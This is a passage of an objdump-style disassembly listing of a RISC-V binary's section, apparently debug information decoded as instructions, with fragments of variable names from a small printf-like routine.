     394:	9102                	.2byte	0x9102
     396:	0d48                	.2byte	0xd48
     398:	0234                	.2byte	0x234
     39a:	0000                	.2byte	0x0
     39c:	4a1e015b          	.4byte	0x4a1e015b
     3a0:	0000                	.2byte	0x0
     3a2:	0200                	.2byte	0x200
     3a4:	4491                	.2byte	0x4491
     3a6:	6c04                	.2byte	0x6c04
     3a8:	6e65                	.2byte	0x6e65
     3aa:	5b00                	.2byte	0x5b00
     3ac:	2b01                	.2byte	0x2b01
     3ae:	000000af          	.4byte	0xaf
     3b2:	7fb89103          	lh	sp,2043(a7)
     3b6:	9815                	.2byte	0x9815
     3b8:	0021                	.2byte	0x21
     3ba:	0080                	.2byte	0x80
     3bc:	0000                	.2byte	0x0
     3be:	8000                	.2byte	0x8000
     3c0:	0000                	.2byte	0x0
     3c2:	0000                	.2byte	0x0
     3c4:	0000                	.2byte	0x0
     3c6:	1100                	.2byte	0x1100
     3c8:	0f000003          	lb	zero,240(zero) # f0 <threadsense.2+0x6c>
     3cc:	0228                	.2byte	0x228
     3ce:	0000                	.2byte	0x0
     3d0:	015e                	.2byte	0x15e
     3d2:	00009e0f          	.4byte	0x9e0f
     3d6:	0200                	.2byte	0x200
     3d8:	5891                	.2byte	0x5891
     3da:	6405                	.2byte	0x6405
     3dc:	6300                	.2byte	0x6300
     3de:	1001                	.2byte	0x1001
     3e0:	0331                	.2byte	0x331
     3e2:	0000                	.2byte	0x0
     3e4:	9102                	.2byte	0x9102
     3e6:	0068                	.2byte	0x68
     3e8:	1810                	.2byte	0x1810
     3ea:	0022                	.2byte	0x22
     3ec:	0080                	.2byte	0x80
     3ee:	0000                	.2byte	0x0
     3f0:	3800                	.2byte	0x3800
     3f2:	0000                	.2byte	0x0
     3f4:	0000                	.2byte	0x0
     3f6:	0000                	.2byte	0x0
     3f8:	0500                	.2byte	0x500
     3fa:	0064                	.2byte	0x64
     3fc:	ca0b0167          	jalr	sp,-864(s6) # ceb4 <threadsense.2+0xce30>
     400:	0000                	.2byte	0x0
     402:	0200                	.2byte	0x200
     404:	6091                	.2byte	0x6091
     406:	0000                	.2byte	0x0
     408:	9e06                	.2byte	0x9e06
     40a:	0000                	.2byte	0x0
     40c:	0b00                	.2byte	0xb00
     40e:	0188                	.2byte	0x188
     410:	0000                	.2byte	0x0
     412:	091f 00c2 0000      	.byte	0x1f, 0x09, 0xc2, 0x00, 0x00, 0x00
     418:	208c                	.2byte	0x208c
     41a:	8000                	.2byte	0x8000
     41c:	0000                	.2byte	0x0
     41e:	0000                	.2byte	0x0
     420:	00dc                	.2byte	0xdc
     422:	0000                	.2byte	0x0
     424:	0000                	.2byte	0x0
     426:	0000                	.2byte	0x0
     428:	9c01                	.2byte	0x9c01
     42a:	03e2                	.2byte	0x3e2
     42c:	0000                	.2byte	0x0
     42e:	ff0d                	.2byte	0xff0d
     430:	0002                	.2byte	0x2
     432:	4b00                	.2byte	0x4b00
     434:	1401                	.2byte	0x1401
     436:	00c2                	.2byte	0xc2
     438:	0000                	.2byte	0x0
     43a:	9102                	.2byte	0x9102
     43c:	0448                	.2byte	0x448
     43e:	00637273          	csrrc	tp,0x6,6
     442:	e226014b          	fnmsub.d	ft2,fa2,ft2,ft8,rne
     446:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     44a:	4091                	.2byte	0x4091
     44c:	6c04                	.2byte	0x6c04
     44e:	6e65                	.2byte	0x6e65
     450:	4b00                	.2byte	0x4b00
     452:	3201                	.2byte	0x3201
     454:	000000af          	.4byte	0xaf
     458:	7fb89103          	lh	sp,2043(a7)
     45c:	c015                	.2byte	0xc015
     45e:	0020                	.2byte	0x20
     460:	0080                	.2byte	0x80
     462:	0000                	.2byte	0x0
     464:	4c00                	.2byte	0x4c00
     466:	0000                	.2byte	0x0
     468:	0000                	.2byte	0x0
     46a:	0000                	.2byte	0x0
     46c:	b500                	.2byte	0xb500
     46e:	05000003          	lb	zero,80(zero) # 50 <buf.4+0x10>
     472:	014e0073          	.4byte	0x14e0073
     476:	e816                	.2byte	0xe816
     478:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     47c:	6891                	.2byte	0x6891
     47e:	6405                	.2byte	0x6405
     480:	4f00                	.2byte	0x4f00
     482:	1001                	.2byte	0x1001
     484:	0331                	.2byte	0x331
     486:	0000                	.2byte	0x0
     488:	9102                	.2byte	0x9102
     48a:	0060                	.2byte	0x60
     48c:	0c10                	.2byte	0xc10
     48e:	0021                	.2byte	0x21
     490:	0080                	.2byte	0x80
     492:	0000                	.2byte	0x0
     494:	4800                	.2byte	0x4800
     496:	0000                	.2byte	0x0
     498:	0000                	.2byte	0x0
     49a:	0000                	.2byte	0x0
     49c:	0500                	.2byte	0x500
     49e:	01530073          	.4byte	0x1530073
     4a2:	db11                	.2byte	0xdb11
     4a4:	0000                	.2byte	0x0
     4a6:	0200                	.2byte	0x200
     4a8:	5891                	.2byte	0x5891
     4aa:	6405                	.2byte	0x6405
     4ac:	5400                	.2byte	0x5400
     4ae:	0b01                	.2byte	0xb01
     4b0:	00ca                	.2byte	0xca
     4b2:	0000                	.2byte	0x0
     4b4:	9102                	.2byte	0x9102
     4b6:	0050                	.2byte	0x50
     4b8:	0600                	.2byte	0x600
     4ba:	000003e7          	jalr	t2,zero # 0 <threadsense.5>
     4be:	00aa0623          	sb	a0,12(s4)
     4c2:	0000                	.2byte	0x0
     4c4:	4411                	.2byte	0x4411
     4c6:	0002                	.2byte	0x2
     4c8:	0300                	.2byte	0x300
     4ca:	05f4                	.2byte	0x5f4
     4cc:	004a                	.2byte	0x4a
     4ce:	0000                	.2byte	0x0
     4d0:	1f9c                	.2byte	0x1f9c
     4d2:	8000                	.2byte	0x8000
     4d4:	0000                	.2byte	0x0
     4d6:	0000                	.2byte	0x0
     4d8:	00f0                	.2byte	0xf0
     4da:	0000                	.2byte	0x0
     4dc:	0000                	.2byte	0x0
     4de:	0000                	.2byte	0x0
     4e0:	9c01                	.2byte	0x9c01
     4e2:	04a0                	.2byte	0x4a0
     4e4:	0000                	.2byte	0x0
     4e6:	7304                	.2byte	0x7304
     4e8:	7274                	.2byte	0x7274
     4ea:	3700                	.2byte	0x3700
     4ec:	1301                	.2byte	0x1301
     4ee:	00ca                	.2byte	0xca
     4f0:	0000                	.2byte	0x0
     4f2:	7e889103          	lh	sp,2024(a7)
     4f6:	6604                	.2byte	0x6604
     4f8:	746d                	.2byte	0x746d
     4fa:	3700                	.2byte	0x3700
     4fc:	2401                	.2byte	0x2401
     4fe:	000000db          	.4byte	0xdb
     502:	7e809103          	lh	sp,2024(ra)
     506:	0516                	.2byte	0x516
     508:	7061                	.2byte	0x7061
     50a:	3900                	.2byte	0x3900
     50c:	0b01                	.2byte	0xb01
     50e:	000000f3          	.4byte	0xf3
     512:	7fb09103          	lh	sp,2043(ra)
     516:	00019b0f          	.4byte	0x19b0f
     51a:	3a00                	.2byte	0x3a00
     51c:	0901                	.2byte	0x901
     51e:	00ca                	.2byte	0xca
     520:	0000                	.2byte	0x0
     522:	7fb89103          	lh	sp,2043(a7)
     526:	e924                	.2byte	0xe924
     528:	0001                	.2byte	0x1
     52a:	0200                	.2byte	0x200
     52c:	013d                	.2byte	0x13d
     52e:	4008                	.2byte	0x4008
     530:	001f 0080 0000      	.byte	0x1f, 0x00, 0x80, 0x00, 0x00, 0x00
     536:	5c00                	.2byte	0x5c00
     538:	0000                	.2byte	0x0
     53a:	0000                	.2byte	0x0
     53c:	0000                	.2byte	0x0
     53e:	0100                	.2byte	0x100
     540:	079c                	.2byte	0x79c
     542:	4891                	.2byte	0x4891
     544:	2306                	.2byte	0x2306
     546:	0190                	.2byte	0x190
     548:	0406                	.2byte	0x406
     54a:	3d006863          	bltu	zero,a6,91a <threadsense.2+0x896>
     54e:	1a01                	.2byte	0x1a01
     550:	004a                	.2byte	0x4a
     552:	0000                	.2byte	0x0
     554:	9102                	.2byte	0x9102
     556:	0d5c                	.2byte	0xd5c
     558:	02ce                	.2byte	0x2ce
     55a:	0000                	.2byte	0x0
     55c:	013d                	.2byte	0x13d
     55e:	a025                	.2byte	0xa025
     560:	0004                	.2byte	0x4
     562:	0200                	.2byte	0x200
     564:	5091                	.2byte	0x5091
     566:	0003040f          	.4byte	0x3040f
     56a:	3f00                	.2byte	0x3f00
     56c:	0c01                	.2byte	0xc01
     56e:	04a5                	.2byte	0x4a5
     570:	0000                	.2byte	0x0
     572:	9102                	.2byte	0x9102
     574:	0068                	.2byte	0x68
     576:	0600                	.2byte	0x600
     578:	00c2                	.2byte	0xc2
     57a:	0000                	.2byte	0x0
     57c:	ca06                	.2byte	0xca06
     57e:	0000                	.2byte	0x0
     580:	1100                	.2byte	0x1100
     582:	0110                	.2byte	0x110
     584:	0000                	.2byte	0x0
     586:	4a05c803          	lbu	a6,1184(a1)
     58a:	0000                	.2byte	0x0
     58c:	c800                	.2byte	0xc800
     58e:	001e                	.2byte	0x1e
     590:	0080                	.2byte	0x80
     592:	0000                	.2byte	0x0
     594:	7800                	.2byte	0x7800
     596:	0000                	.2byte	0x0
     598:	0000                	.2byte	0x0
     59a:	0000                	.2byte	0x0
     59c:	0100                	.2byte	0x100
     59e:	ed9c                	.2byte	0xed9c
     5a0:	0004                	.2byte	0x4
     5a2:	0400                	.2byte	0x400
     5a4:	6d66                	.2byte	0x6d66
     5a6:	0074                	.2byte	0x74
     5a8:	012c                	.2byte	0x12c
     5aa:	db18                	.2byte	0xdb18
     5ac:	0000                	.2byte	0x0
     5ae:	0300                	.2byte	0x300
     5b0:	9891                	.2byte	0x9891
     5b2:	6105167f 012e0070 	.byte	0x7f, 0x16, 0x05, 0x61, 0x70, 0x00, 0x2e, 0x01, 0x0b, 0xf3, 0x00, 0x00
     5ba:	0000f30b 
     5be:	0300                	.2byte	0x300
     5c0:	a891                	.2byte	0xa891
     5c2:	007f c117 0001 9500 	.byte	0x7f, 0x00, 0x17, 0xc1, 0x01, 0x00, 0x00, 0x95, 0x0d, 0x88
     5ca:	880d 
     5cc:	001a                	.2byte	0x1a
     5ce:	0080                	.2byte	0x80
     5d0:	0000                	.2byte	0x0
     5d2:	4000                	.2byte	0x4000
     5d4:	0004                	.2byte	0x4
     5d6:	0000                	.2byte	0x0
     5d8:	0000                	.2byte	0x0
     5da:	0100                	.2byte	0x100
     5dc:	259c                	.2byte	0x259c
     5de:	0006                	.2byte	0x6
     5e0:	0100                	.2byte	0x100
     5e2:	01f1                	.2byte	0x1f1
     5e4:	0000                	.2byte	0x0
     5e6:	9502                	.2byte	0x9502
     5e8:	351e                	.2byte	0x351e
     5ea:	0006                	.2byte	0x6
     5ec:	0300                	.2byte	0x300
     5ee:	a891                	.2byte	0xa891
     5f0:	017f 022d 0000 9502 	.byte	0x7f, 0x01, 0x2d, 0x02, 0x00, 0x00, 0x02, 0x95, 0x3a, 0xa0
     5f8:	a03a 
     5fa:	0004                	.2byte	0x4
     5fc:	0300                	.2byte	0x300
     5fe:	a091                	.2byte	0xa091
     600:	037f 6d66 0074 9502 	.byte	0x7f, 0x03, 0x66, 0x6d, 0x74, 0x00, 0x02, 0x95, 0x4e, 0xdb
     608:	db4e 
     60a:	0000                	.2byte	0x0
     60c:	0300                	.2byte	0x300
     60e:	9891                	.2byte	0x9891
     610:	037f 7061 0200 5b95 	.byte	0x7f, 0x03, 0x61, 0x70, 0x00, 0x02, 0x95, 0x5b, 0xf3, 0x00
     618:	00f3 
     61a:	0000                	.2byte	0x0
     61c:	7f909103          	lh	sp,2041(ra)
     620:	7002                	.2byte	0x7002
     622:	0200                	.2byte	0x200
     624:	00db1897          	auipc	a7,0xdb1
     628:	0000                	.2byte	0x0
     62a:	6201                	.2byte	0x6201
     62c:	ba08                	.2byte	0xba08
     62e:	0002                	.2byte	0x2
     630:	0200                	.2byte	0x200
     632:	0f98                	.2byte	0xf98
     634:	000000db          	.4byte	0xdb
     638:	7fb89103          	lh	sp,2043(a7) # db1e1f <threadsense.2+0xdb1d9b>
     63c:	6302                	.2byte	0x6302
     63e:	0068                	.2byte	0x68
     640:	9902                	.2byte	0x9902
     642:	4a10                	.2byte	0x4a10
     644:	0000                	.2byte	0x0
     646:	0100                	.2byte	0x100
     648:	2559                	.2byte	0x2559
     64a:	7265                	.2byte	0x7265
     64c:	0072                	.2byte	0x72
     64e:	9902                	.2byte	0x9902
     650:	4a14                	.2byte	0x4a14
     652:	0000                	.2byte	0x0
     654:	0200                	.2byte	0x200
     656:	756e                	.2byte	0x756e
     658:	006d                	.2byte	0x6d
     65a:	9a02                	.2byte	0x9a02
     65c:	e016                	.2byte	0xe016
     65e:	0000                	.2byte	0x0
     660:	0200                	.2byte	0x200
     662:	5891                	.2byte	0x5891
     664:	5f08                	.2byte	0x5f08
     666:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     66a:	004a079b          	addw	a5,s4,4
     66e:	0000                	.2byte	0x0
     670:	9102                	.2byte	0x9102
     672:	0854                	.2byte	0x854
     674:	0182                	.2byte	0x182
     676:	0000                	.2byte	0x0
     678:	9b02                	.2byte	0x9b02
     67a:	4a0d                	.2byte	0x4a0d
     67c:	0000                	.2byte	0x0
     67e:	0200                	.2byte	0x200
     680:	5091                	.2byte	0x5091
     682:	cb08                	.2byte	0xcb08
     684:	0001                	.2byte	0x1
     686:	0200                	.2byte	0x200
     688:	004a149b          	sllw	s1,s4,0x4
     68c:	0000                	.2byte	0x0
     68e:	9102                	.2byte	0x9102
     690:	084c                	.2byte	0x84c
     692:	0148                	.2byte	0x148
     694:	0000                	.2byte	0x0
     696:	9b02                	.2byte	0x9b02
     698:	00004a1b          	.4byte	0x4a1b
     69c:	0200                	.2byte	0x200
     69e:	4891                	.2byte	0x4891
     6a0:	1808                	.2byte	0x1808
     6a2:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     6a6:	004a269b          	.4byte	0x4a269b
     6aa:	0000                	.2byte	0x0
     6ac:	7fb49103          	lh	sp,2043(s1)
     6b0:	6908                	.2byte	0x6908
     6b2:	0001                	.2byte	0x1
     6b4:	0200                	.2byte	0x200
     6b6:	089c                	.2byte	0x89c
     6b8:	000000cf          	fnmadd.s	ft1,ft0,ft0,ft0,rne
     6bc:	9102                	.2byte	0x9102
     6be:	02641847          	fmsub.d	fa6,fs0,ft6,ft0,rtz
     6c2:	0000                	.2byte	0x0
     6c4:	03ae                	.2byte	0x3ae
     6c6:	1b30                	.2byte	0x1b30
     6c8:	8000                	.2byte	0x8000
     6ca:	0000                	.2byte	0x0
     6cc:	0000                	.2byte	0x0
     6ce:	4018                	.2byte	0x4018
     6d0:	0001                	.2byte	0x1
     6d2:	da00                	.2byte	0xda00
     6d4:	3c05                	.2byte	0x3c05
     6d6:	001c                	.2byte	0x1c
     6d8:	0080                	.2byte	0x80
     6da:	0000                	.2byte	0x0
     6dc:	1900                	.2byte	0x1900
     6de:	01a2                	.2byte	0x1a2
     6e0:	0000                	.2byte	0x0
     6e2:	011a                	.2byte	0x11a
     6e4:	1e54                	.2byte	0x1e54
     6e6:	8000                	.2byte	0x8000
     6e8:	0000                	.2byte	0x0
     6ea:	0000                	.2byte	0x0
     6ec:	a019                	.2byte	0xa019
     6ee:	0001                	.2byte	0x1
     6f0:	1800                	.2byte	0x1800
     6f2:	3c01                	.2byte	0x3c01
     6f4:	001e                	.2byte	0x1e
     6f6:	0080                	.2byte	0x80
     6f8:	0000                	.2byte	0x0
     6fa:	0000                	.2byte	0x0
     6fc:	3526                	.2byte	0x3526
     6fe:	0006                	.2byte	0x6
     700:	1a00                	.2byte	0x1a00
     702:	004a                	.2byte	0x4a
     704:	0000                	.2byte	0x0
     706:	a01a                	.2byte	0xa01a
     708:	0004                	.2byte	0x4
     70a:	0000                	.2byte	0x0
     70c:	2506                	.2byte	0x2506
     70e:	0006                	.2byte	0x6
     710:	0a00                	.2byte	0xa00
     712:	02f1                	.2byte	0x2f1
     714:	0000                	.2byte	0x0
     716:	8b02                	.2byte	0x8b02
     718:	bb12                	.2byte	0xbb12
     71a:	0000                	.2byte	0x0
     71c:	f400                	.2byte	0xf400
     71e:	0019                	.2byte	0x19
     720:	0080                	.2byte	0x80
     722:	0000                	.2byte	0x0
     724:	9400                	.2byte	0x9400
     726:	0000                	.2byte	0x0
     728:	0000                	.2byte	0x0
     72a:	0000                	.2byte	0x0
     72c:	0100                	.2byte	0x100
     72e:	7a9c                	.2byte	0x7a9c
     730:	0006                	.2byte	0x6
     732:	0300                	.2byte	0x300
     734:	7061                	.2byte	0x7061
     736:	0200                	.2byte	0x200
     738:	067a228b          	.4byte	0x67a228b
     73c:	0000                	.2byte	0x0
     73e:	9102                	.2byte	0x9102
     740:	0168                	.2byte	0x168
     742:	0182                	.2byte	0x182
     744:	0000                	.2byte	0x0
     746:	8b02                	.2byte	0x8b02
     748:	4a2a                	.2byte	0x4a2a
     74a:	0000                	.2byte	0x0
     74c:	0200                	.2byte	0x200
     74e:	6491                	.2byte	0x6491
     750:	0600                	.2byte	0x600
     752:	000000f3          	.4byte	0xf3
     756:	110a                	.2byte	0x110a
     758:	0002                	.2byte	0x2
     75a:	0200                	.2byte	0x200
     75c:	1b81                	.2byte	0x1b81
     75e:	00e0                	.2byte	0xe0
     760:	0000                	.2byte	0x0
     762:	1958                	.2byte	0x1958
     764:	8000                	.2byte	0x8000
     766:	0000                	.2byte	0x0
     768:	0000                	.2byte	0x0
     76a:	009c                	.2byte	0x9c
     76c:	0000                	.2byte	0x0
     76e:	0000                	.2byte	0x0
     770:	0000                	.2byte	0x0
     772:	9c01                	.2byte	0x9c01
     774:	000006bf 00706103 	.8byte	0x706103000006bf
     77c:	8102                	.2byte	0x8102
     77e:	7a2c                	.2byte	0x7a2c
     780:	0006                	.2byte	0x6
     782:	0200                	.2byte	0x200
     784:	6891                	.2byte	0x6891
     786:	8201                	.2byte	0x8201
     788:	0001                	.2byte	0x1
     78a:	0200                	.2byte	0x200
     78c:	3481                	.2byte	0x3481
     78e:	004a                	.2byte	0x4a
     790:	0000                	.2byte	0x0
     792:	9102                	.2byte	0x9102
     794:	0064                	.2byte	0x64
     796:	00033317          	auipc	t1,0x33
     79a:	6c00                	.2byte	0x6c00
     79c:	0c14                	.2byte	0xc14
     79e:	0018                	.2byte	0x18
     7a0:	0080                	.2byte	0x80
     7a2:	0000                	.2byte	0x0
     7a4:	4c00                	.2byte	0x4c00
     7a6:	0001                	.2byte	0x1
     7a8:	0000                	.2byte	0x0
     7aa:	0000                	.2byte	0x0
     7ac:	0100                	.2byte	0x100
     7ae:	5c9c                	.2byte	0x5c9c
     7b0:	01000007          	.4byte	0x1000007
     7b4:	01f1                	.2byte	0x1f1
     7b6:	0000                	.2byte	0x0
     7b8:	6c02                	.2byte	0x6c02
     7ba:	3524                	.2byte	0x3524
     7bc:	0006                	.2byte	0x6
     7be:	0300                	.2byte	0x300
     7c0:	d891                	.2byte	0xd891
     7c2:	017d                	.2byte	0x17d
     7c4:	022d                	.2byte	0x22d
     7c6:	0000                	.2byte	0x0
     7c8:	6c02                	.2byte	0x6c02
     7ca:	a040                	.2byte	0xa040
     7cc:	0004                	.2byte	0x4
     7ce:	0300                	.2byte	0x300
     7d0:	d091                	.2byte	0xd091
     7d2:	037d                	.2byte	0x37d
     7d4:	756e                	.2byte	0x756e
     7d6:	006d                	.2byte	0x6d
     7d8:	6d02                	.2byte	0x6d02
     7da:	e028                	.2byte	0xe028
     7dc:	0000                	.2byte	0x0
     7de:	0300                	.2byte	0x300
     7e0:	c891                	.2byte	0xc891
     7e2:	017d                	.2byte	0x17d
     7e4:	035f 0000 6d02      	.byte	0x5f, 0x03, 0x00, 0x00, 0x02, 0x6d
     7ea:	6036                	.2byte	0x6036
     7ec:	0000                	.2byte	0x0
     7ee:	0300                	.2byte	0x300
     7f0:	c491                	.2byte	0xc491
     7f2:	017d                	.2byte	0x17d
     7f4:	000001cb          	fnmsub.s	ft3,ft0,ft0,ft0,rne
     7f8:	6d02                	.2byte	0x6d02
     7fa:	4a40                	.2byte	0x4a40
     7fc:	0000                	.2byte	0x0
     7fe:	0300                	.2byte	0x300
     800:	c091                	.2byte	0xc091
     802:	017d                	.2byte	0x17d
     804:	0169                	.2byte	0x169
     806:	0000                	.2byte	0x0
     808:	6d02                	.2byte	0x6d02
     80a:	00004a4b          	fnmsub.s	fs4,ft0,ft0,ft0,rmm
     80e:	0300                	.2byte	0x300
     810:	bc91                	.2byte	0xbc91
     812:	087d                	.2byte	0x87d
     814:	017d                	.2byte	0x17d
     816:	0000                	.2byte	0x0
     818:	6f02                	.2byte	0x6f02
     81a:	5c0c                	.2byte	0x5c0c
     81c:	03000007          	.4byte	0x3000007
     820:	e891                	.2byte	0xe891
     822:	027d                	.2byte	0x27d
     824:	6f70                	.2byte	0x6f70
     826:	70020073          	.4byte	0x70020073
     82a:	00004a07          	.4byte	0x4a07
     82e:	0200                	.2byte	0x200
     830:	6c91                	.2byte	0x6c91
     832:	1200                	.2byte	0x1200
     834:	0060                	.2byte	0x60
     836:	0000                	.2byte	0x0
     838:	076c                	.2byte	0x76c
     83a:	0000                	.2byte	0x0
     83c:	00007a13          	and	s4,zero,0
     840:	3f00                	.2byte	0x3f00
     842:	1b00                	.2byte	0x1b00
     844:	0364                	.2byte	0x364
     846:	0000                	.2byte	0x0
     848:	545e                	.2byte	0x545e
     84a:	00800017          	auipc	zero,0x800
     84e:	0000                	.2byte	0x0
     850:	b800                	.2byte	0xb800
     852:	0000                	.2byte	0x0
     854:	0000                	.2byte	0x0
     856:	0000                	.2byte	0x0
     858:	0100                	.2byte	0x100
     85a:	b29c                	.2byte	0xb29c
     85c:	03000007          	.4byte	0x3000007
     860:	0078                	.2byte	0x78
     862:	5e02                	.2byte	0x5e02
     864:	8d18                	.2byte	0x8d18
     866:	0000                	.2byte	0x0
     868:	0200                	.2byte	0x200
     86a:	4891                	.2byte	0x4891
     86c:	7302                	.2byte	0x7302
     86e:	7274                	.2byte	0x7274
     870:	0200                	.2byte	0x200
     872:	0860                	.2byte	0x860
     874:	07b2                	.2byte	0x7b2
     876:	0000                	.2byte	0x0
     878:	9102                	.2byte	0x9102
     87a:	0258                	.2byte	0x258
     87c:	0069                	.2byte	0x69
     87e:	6102                	.2byte	0x6102
     880:	00004a07          	.4byte	0x4a07
     884:	0200                	.2byte	0x200
     886:	6c91                	.2byte	0x6c91
     888:	1200                	.2byte	0x1200
     88a:	000000cf          	fnmadd.s	ft1,ft0,ft0,ft0,rne
     88e:	07c2                	.2byte	0x7c2
     890:	0000                	.2byte	0x0
     892:	00007a13          	and	s4,zero,0
     896:	1000                	.2byte	0x1000
     898:	1100                	.2byte	0x1100
     89a:	0175                	.2byte	0x175
     89c:	0000                	.2byte	0x0
     89e:	4a05dc03          	lhu	s8,1184(a1)
     8a2:	0000                	.2byte	0x0
     8a4:	c000                	.2byte	0xc000
     8a6:	0016                	.2byte	0x16
     8a8:	0080                	.2byte	0x80
     8aa:	0000                	.2byte	0x0
     8ac:	9400                	.2byte	0x9400
     8ae:	0000                	.2byte	0x0
     8b0:	0000                	.2byte	0x0
     8b2:	0000                	.2byte	0x0
     8b4:	0100                	.2byte	0x100
     8b6:	0b9c                	.2byte	0xb9c
     8b8:	0008                	.2byte	0x8
     8ba:	0300                	.2byte	0x300
     8bc:	02006863          	bltu	zero,zero,8ec <threadsense.2+0x868>
     8c0:	114e                	.2byte	0x114e
     8c2:	004a                	.2byte	0x4a
     8c4:	0000                	.2byte	0x0
     8c6:	9102                	.2byte	0x9102
     8c8:	276c                	.2byte	0x276c
     8ca:	7562                	.2byte	0x7562
     8cc:	0066                	.2byte	0x66
     8ce:	5002                	.2byte	0x5002
     8d0:	0b18                	.2byte	0xb18
     8d2:	0008                	.2byte	0x8
     8d4:	4000                	.2byte	0x4000
     8d6:	521c                	.2byte	0x521c
     8d8:	0001                	.2byte	0x1
     8da:	0200                	.2byte	0x200
     8dc:	4a51                	.2byte	0x4a51
     8de:	0000                	.2byte	0x0
     8e0:	0000                	.2byte	0x0
     8e2:	cf12                	.2byte	0xcf12
     8e4:	0000                	.2byte	0x0
     8e6:	1b00                	.2byte	0x1b00
     8e8:	0008                	.2byte	0x8
     8ea:	1300                	.2byte	0x1300
     8ec:	007a                	.2byte	0x7a
     8ee:	0000                	.2byte	0x0
     8f0:	601b003f 39000001 	.8byte	0x39000001601b003f
     8f8:	166c                	.2byte	0x166c
     8fa:	8000                	.2byte	0x8000
     8fc:	0000                	.2byte	0x0
     8fe:	0000                	.2byte	0x0
     900:	0054                	.2byte	0x54
     902:	0000                	.2byte	0x0
     904:	0000                	.2byte	0x0
     906:	0000                	.2byte	0x0
     908:	9c01                	.2byte	0x9c01
     90a:	0845                	.2byte	0x845
     90c:	0000                	.2byte	0x0
     90e:	02007303          	.4byte	0x2007303
     912:	1b39                	.2byte	0x1b39
     914:	000000db          	.4byte	0xdb
     918:	9102                	.2byte	0x9102
     91a:	0058                	.2byte	0x58
     91c:	5e28                	.2byte	0x5e28
     91e:	0002                	.2byte	0x2
     920:	0200                	.2byte	0x200
     922:	0634                	.2byte	0x634
     924:	1654                	.2byte	0x1654
     926:	8000                	.2byte	0x8000
     928:	0000                	.2byte	0x0
     92a:	0000                	.2byte	0x0
     92c:	0018                	.2byte	0x18
     92e:	0000                	.2byte	0x0
     930:	0000                	.2byte	0x0
     932:	0000                	.2byte	0x0
     934:	9c01                	.2byte	0x9c01
     936:	9d29                	.2byte	0x9d29
     938:	0002                	.2byte	0x2
     93a:	0200                	.2byte	0x200
     93c:	1630062f          	.4byte	0x1630062f
     940:	8000                	.2byte	0x8000
     942:	0000                	.2byte	0x0
     944:	0000                	.2byte	0x0
     946:	0024                	.2byte	0x24
     948:	0000                	.2byte	0x0
     94a:	0000                	.2byte	0x0
     94c:	0000                	.2byte	0x0
     94e:	9c01                	.2byte	0x9c01
     950:	088d                	.2byte	0x88d
     952:	0000                	.2byte	0x0
     954:	8901                	.2byte	0x8901
     956:	0002                	.2byte	0x2
     958:	0200                	.2byte	0x200
     95a:	004a0f2f          	.4byte	0x4a0f2f
     95e:	0000                	.2byte	0x0
     960:	9102                	.2byte	0x9102
     962:	006c                	.2byte	0x6c
     964:	8f11                	.2byte	0x8f11
     966:	0001                	.2byte	0x1
     968:	0200                	.2byte	0x200
     96a:	212a                	.2byte	0x212a
     96c:	009e                	.2byte	0x9e
     96e:	0000                	.2byte	0x0
     970:	160c                	.2byte	0x160c
     972:	8000                	.2byte	0x8000
     974:	0000                	.2byte	0x0
     976:	0000                	.2byte	0x0
     978:	0024                	.2byte	0x24
     97a:	0000                	.2byte	0x0
     97c:	0000                	.2byte	0x0
     97e:	0000                	.2byte	0x0
     980:	9c01                	.2byte	0x9c01
     982:	08dd                	.2byte	0x8dd
     984:	0000                	.2byte	0x0
     986:	3e01                	.2byte	0x3e01
     988:	0002                	.2byte	0x2
     98a:	0200                	.2byte	0x200
     98c:	372a                	.2byte	0x372a
     98e:	009e                	.2byte	0x9e
     990:	0000                	.2byte	0x0
     992:	9102                	.2byte	0x9102
     994:	0368                	.2byte	0x368
     996:	7065                	.2byte	0x7065
     998:	2a020063          	beqz	tp,c38 <threadsense.2+0xbb4>
     99c:	9e48                	.2byte	0x9e48
     99e:	0000                	.2byte	0x0
     9a0:	0200                	.2byte	0x200
     9a2:	6091                	.2byte	0x6091
     9a4:	6d01                	.2byte	0x6d01
     9a6:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     9aa:	572a                	.2byte	0x572a
     9ac:	0331                	.2byte	0x331
     9ae:	0000                	.2byte	0x0
     9b0:	9102                	.2byte	0x9102
     9b2:	0058                	.2byte	0x58
     9b4:	962a                	.2byte	0x962a
     9b6:	0002                	.2byte	0x2
     9b8:	0200                	.2byte	0x200
     9ba:	2024                	.2byte	0x2024
     9bc:	15dc                	.2byte	0x15dc
     9be:	8000                	.2byte	0x8000
     9c0:	0000                	.2byte	0x0
     9c2:	0000                	.2byte	0x0
     9c4:	0030                	.2byte	0x30
     9c6:	0000                	.2byte	0x0
     9c8:	0000                	.2byte	0x0
     9ca:	0000                	.2byte	0x0
     9cc:	9c01                	.2byte	0x9c01
     9ce:	0000090b          	.4byte	0x90b
     9d2:	8901                	.2byte	0x8901
     9d4:	0002                	.2byte	0x2
     9d6:	0200                	.2byte	0x200
     9d8:	3624                	.2byte	0x3624
     9da:	009e                	.2byte	0x9e
     9dc:	0000                	.2byte	0x0
     9de:	9102                	.2byte	0x9102
     9e0:	0068                	.2byte	0x68
     9e2:	8e0a                	.2byte	0x8e0a
     9e4:	0002                	.2byte	0x2
     9e6:	0200                	.2byte	0x200
     9e8:	1212                	.2byte	0x1212
     9ea:	009e                	.2byte	0x9e
     9ec:	0000                	.2byte	0x0
     9ee:	1538                	.2byte	0x1538
     9f0:	8000                	.2byte	0x8000
     9f2:	0000                	.2byte	0x0
     9f4:	0000                	.2byte	0x0
     9f6:	00a4                	.2byte	0xa4
     9f8:	0000                	.2byte	0x0
     9fa:	0000                	.2byte	0x0
     9fc:	0000                	.2byte	0x0
     9fe:	9c01                	.2byte	0x9c01
     a00:	097e                	.2byte	0x97e
     a02:	0000                	.2byte	0x0
     a04:	5901                	.2byte	0x5901
     a06:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     a0a:	2412                	.2byte	0x2412
     a0c:	009e                	.2byte	0x9e
     a0e:	0000                	.2byte	0x0
     a10:	7ef89103          	lh	sp,2031(a7)
     a14:	3c01                	.2byte	0x3c01
     a16:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     a1a:	3412                	.2byte	0x3412
     a1c:	008d                	.2byte	0x8d
     a1e:	0000                	.2byte	0x0
     a20:	7ef09103          	lh	sp,2031(ra)
